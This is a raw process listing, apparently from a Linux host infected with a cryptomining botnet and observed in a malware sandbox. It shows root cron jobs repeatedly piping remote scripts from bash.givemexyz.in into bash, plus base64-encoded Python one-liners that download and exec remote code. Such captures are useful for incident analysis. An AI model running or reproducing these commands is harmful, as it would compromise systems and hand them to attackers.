+4 S root      699976  699974  0  80   0 -   600 -      07:24 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      699988  699976  0  80   0 -  1651 -      07:24 ?        00:00:00 bash -
+0 S root      699989  699988  0  80   0 -  4834 -      07:24 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      700475  699989  0  80   0 -   600 -      07:25 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root      700478  700475  0  80   0 -  1651 -      07:25 ?        00:00:00 bash -
+0 S root      700479  700478  0  80   0 -  4730 -      07:25 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+5 S root      700673     541  0  80   0 -  1934 -      07:26 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      700676  700673  0  80   0 -   600 -      07:26 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      700808  700676  0  80   0 -  1651 -      07:26 ?        00:00:00 bash -
+0 S root      700810  700808  0  80   0 -  4695 -      07:26 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+1 I root      701021       2  0  80   0 -     0 -      07:26 ?        00:00:00 [kworker/2:1-events]
+0 S root      701207  698801  0  80   0 -   600 -      07:26 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root      701210  701207  0  80   0 -  1651 -      07:26 ?        00:00:00 bash -
+0 S root      701211  701210  0  80   0 -  4695 -      07:26 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+5 S root      701524     541  0  80   0 -  1934 -      07:28 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      701525  701524  0  80   0 -   600 -      07:28 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      701537  701525  0  80   0 -  1651 -      07:28 ?        00:00:00 bash -
+0 S root      701538  701537  0  80   0 -  4695 -      07:28 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      702299     541  0  80   0 -  1934 -      07:31 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      702300  702299  0  80   0 -   600 -      07:31 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      702307  702300  0  80   0 -  1651 -      07:31 ?        00:00:00 bash -
+0 S root      702308  702307  0  80   0 -  4695 -      07:31 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      702310     541  0  80   0 -  1934 -      07:32 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      702314  702310  0  80   0 -   600 -      07:32 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      702326  702314  0  80   0 -  1651 -      07:32 ?        00:00:00 bash -
+0 S root      702327  702326  0  80   0 -  4731 -      07:32 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      702705     541  0  80   0 -  1934 -      07:37 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      702706  702705  0  80   0 -   600 -      07:37 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      702715  702706  0  80   0 -  1651 -      07:37 ?        00:00:00 bash -
+0 S root      702716  702715  0  80   0 -  4731 -      07:37 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      703006       1 99  80   0 - 78092 -      07:38 ?        01:48:11 dbused
+5 S root      703432     541  0  80   0 -  1934 -      07:39 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      703433  703432  0  80   0 -   600 -      07:39 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      703440  703433  0  80   0 -  1651 -      07:39 ?        00:00:00 bash -
+0 S root      703441  703440  0  80   0 -  4695 -      07:39 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+1 I root      703625       2  0  80   0 -     0 -      07:41 ?        00:00:00 [kworker/3:0-events]
+1 I root      703784       2  0  80   0 -     0 -      07:41 ?        00:00:00 [kworker/2:0-events]
+5 S root      703829     541  0  80   0 -  1934 -      07:42 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      703832  703829  0  80   0 -   600 -      07:42 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      703843  703832  0  80   0 -  1651 -      07:42 ?        00:00:00 bash -
+0 S root      703844  703843  0  80   0 -  5756 -      07:42 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      704159     541  0  80   0 -  1934 -      07:44 ?        00:00:00 /usr/sbin/CRON -f
+5 S root      704160     541  0  80   0 -  1934 -      07:44 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      704162  704159  0  80   0 -   600 -      07:44 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+4 S root      704164  704160  0  80   0 -   600 -      07:44 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      704176  704162  0  80   0 -  1651 -      07:44 ?        00:00:00 bash -
+0 S root      704177  704176  0  80   0 -  4695 -      07:44 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root      704323  704164  0  80   0 -  1651 -      07:44 ?        00:00:00 bash -
+0 S root      704324  704323  0  80   0 -  4730 -      07:44 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+1 I root      704384       2  0  80   0 -     0 -      07:44 ?        00:00:00 [kworker/3:3-cgroup_destroy]
+1 I root      705986       2  0  80   0 -     0 -      07:50 ?        00:00:00 [kworker/1:1-events]
+5 S root      706507     541  0  80   0 -  1934 -      07:52 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      706508  706507  0  80   0 -   600 -      07:52 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      706520  706508  0  80   0 -  1651 -      07:52 ?        00:00:00 bash -
+0 S root      706521  706520  0  80   0 -  4695 -      07:52 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+1 I root      706920       2  0  80   0 -     0 -      07:54 ?        00:00:00 [kworker/u64:0-events_unbound]
+1 I root      709620       2  0  80   0 -     0 -      08:00 ?        00:00:00 [kworker/0:2-events]
+1 I root      709695       2  0  80   0 -     0 -      08:00 ?        00:00:00 [kworker/1:2-ata_sff]
+1 I root      711207       2  0  80   0 -     0 -      08:05 ?        00:00:00 [kworker/1:0-ata_sff]
+1 I root      711209       2  0  80   0 -     0 -      08:05 ?        00:00:00 [kworker/3:1-events]
+1 I root      711210       2  0  80   0 -     0 -      08:05 ?        00:00:00 [kworker/0:1-cgroup_destroy]
+0 S root      711211    1066  0  80   0 -  1684 -      08:05 pts/0    00:00:00 /bin/bash ./malbox.sh
+4 R root      711229  711211  0  80   0 -  2153 -      08:05 pts/0    00:00:00 ps -elf
